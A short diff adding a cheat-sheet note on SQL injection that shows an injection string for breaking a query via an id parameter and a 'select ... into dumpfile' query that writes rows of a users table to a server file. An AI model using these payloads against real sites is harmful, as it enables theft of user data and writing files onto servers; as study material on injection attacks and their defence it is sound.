@@ -1,0 +1,8 @@
+Dumping Database outfile
+
+we can dump the database into any outfile by first breaking the sql query using ?id=1′–+
+
+we can use the dumpfile function 
+
+select * from users limit 0,1 into dumpfile "/tmp/anyfile.txt"
+
